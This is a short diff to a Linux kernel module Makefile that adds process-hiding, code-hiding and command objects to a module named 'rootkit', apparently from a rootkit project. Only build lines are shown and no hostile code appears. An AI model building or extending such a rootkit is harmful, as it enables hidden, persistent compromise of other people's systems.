@@ -1,5 +1,8 @@
 obj-m = rootkit.o
 
+rootkit-objs += process_hiding.o
+rootkit-objs += commands.o
+rootkit-objs += code_hiding.o
 rootkit-objs += file_hiding.o
 rootkit-objs += mod.o
 
